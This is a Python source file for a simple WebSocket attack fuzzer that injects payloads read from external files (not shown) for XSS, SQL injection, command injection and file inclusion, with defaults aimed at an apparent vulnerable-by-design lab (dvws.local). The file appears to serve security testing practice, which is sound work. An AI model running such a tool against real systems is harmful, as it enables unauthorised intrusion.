from argparse import ArgumentParser
import wsHandler as w
import sys
import base64
from colorama import init, Fore

# coloura initialization
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


def args():
    parser = ArgumentParser()
    
    # Uncomment this
    # parser.add_argument('-t', '--target', nargs='?', type=str, required=True, help='Target Websocket URL')
    # parser.add_argument('-a', '--attack', choices=['xss', 'sqli', 'cmdi, 'lfi'], required=True, help='Type of attack to carry out')
    # parser.add_argument('-r', '--request', nargs='?', type=str, required=True, help="Format of an example request, e.g. {'auth_user'':'*','auth_pass':'*'}")
    # parser.add_argument('-p', '--payload', nargs='?', type=str, help='Payload file to use')
    
    # Testing Purpose (sqli)
    parser.add_argument('-t', '--target', nargs='?', type=str, help='Target Websocket URL', default='ws://dvws.local:8080/authenticate-user-blind')
    parser.add_argument('-a', '--attack', choices=['xss', 'sqli', 'cmdi' , 'lfi'], help='Type of attack to carry out', default='sqli')
    parser.add_argument('-r', '--request', nargs='?', type=str, help="Format of an example request, e.g. {'auth_user'':'*','auth_pass':'*'}", default='{"auth_user":"*","auth_pass":""}')
    parser.add_argument('-p', '--payload', nargs='?', type=str, help='Payload file to use', default='payloads/sqli.txt')
    return parser.parse_args()

    # # Testing Purpose (xss)
    # parser.add_argument('-t', '--target', nargs='?', type=str, help='Target Websocket URL', default='ws://dvws.local:8080/reflected-xss')
    # parser.add_argument('-a', '--attack', choices=['xss', 'sqli', 'cmdi', 'lfi'], help='Type of attack to carry out', default='xss')
    # parser.add_argument('-r', '--request', nargs='?', type=str, help="Format of an example request, e.g. {'auth_user'':'*','auth_pass':'*'}", default="{'*'}")
    # parser.add_argument('-p', '--payload', nargs='?', type=str, help='Payload file to use', default='payloads/xss.txt')
    # return parser.parse_args()

    # # Testing Purpose (cli)
    # parser.add_argument('-t', '--target', nargs='?', type=str, help='Target Websocket URL', default='ws://dvws.local:8080/command-execution')
    # parser.add_argument('-a', '--attack', choices=['xss', 'sqli', 'cmdi', 'lfi'], help='Type of attack to carry out', default='cmdi')
    # parser.add_argument('-r', '--request', nargs='?', type=str, help="Format of an example request, e.g. {'auth_user'':'*','auth_pass':'*'}", default="{'*'}")
    # parser.add_argument('-p', '--payload', nargs='?', type=str, help='Payload file to use', default='payloads/cmdi.txt')
    # return parser.parse_args()

    # Testing Purpose (lfi)
    # parser.add_argument('-t', '--target', nargs='?', type=str, help='Target Websocket URL', default='ws://dvws.local:8080/file-inclusion')
    # parser.add_argument('-a', '--attack', choices=['xss', 'sqli', 'cmdi, lfi'], help='Type of attack to carry out', default='lfi')
    # parser.add_argument('-r', '--request', nargs='?', type=str, help="Format of an example request, e.g. {'auth_user'':'*','auth_pass':'*'}", default="{'*'}")
    # parser.add_argument('-p', '--payload', nargs='?', type=str, help='Payload file to use', default='payloads/lfi.txt')
    # return parser.parse_args()





def xss(target, payload, exampleRequest):
    print(f"{GREEN}[+]{RESET} xss selected! Commencing XSS attack...")
    with open (payload, 'r') as payload_file:
        payloads = payload_file.readlines()
    for line in payloads:
        line = line.replace('\n', '')
        newRequest = exampleRequest.replace('*', line)
        w.InteractWithWsSite(target, newRequest)
    print('xss')
    


def lfi(target, payload, exampleRequest):
    print(f"{GREEN}[+]{RESET} lfi selected! Commencing LFI attack...")
    with open (payload, 'r') as payload_file:
        payloads = payload_file.readlines()
    for line in payloads:
        line = line.replace('\n', '')
        newRequest = exampleRequest.replace('*', line)
        w.InteractWithWsSite(target, newRequest)
    print('lfi')



def sqli(target, payload, exampleRequest):
    print(f"{GREEN}[+]{RESET} sqli selected! Commencing SQLi attack...")
    with open (payload, 'r') as payload_file:
        payloads = payload_file.readlines()
    for line in payloads:
        line = line.replace('\n', '')
        print("payload: %s" % line)
        msg = line.encode('utf-8')
        b64 = base64.b64encode(msg)
        msg = b64.decode('utf-8')
        newRequest = exampleRequest.replace('*', msg)
        response = w.InteractWithWsSite(target, newRequest)
        print("response: %s\n" % response)
    


def cmdi(target, payload, exampleRequest):
    print(f"{GREEN}[+]{RESET} cmdi selected! Commencing command injection attack...")
    with open (payload, 'r') as payload_file:
        payloads = payload_file.readlines()
    for line in payloads:
        line = line.replace('\n', '')
        newRequest = exampleRequest.replace('*', line)
        w.InteractWithWsSite(target, newRequest)
    print('cmd injection')



def main():
    arg = args()

    if arg.target[0:5] != "ws://":
        print(f"{RED}[-]{RESET} Please enter a valid websocket url")
        exit(0)

    if arg.attack == 'xss':
        xss(arg.target, arg.payload, arg.request)
    if arg.attack == 'lfi':
        lfi(arg.target, arg.payload, arg.request)
    if arg.attack == 'sqli':
        sqli(arg.target, arg.payload, arg.request)
    if arg.attack == 'cmdi':
        cmdi(arg.target, arg.payload, arg.request)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"{RED}[-]{RESET} User initiated termination, exiting...")
    except:
        print(f"{RED}[-]{RESET} Unexpected errors occurred, exiting...")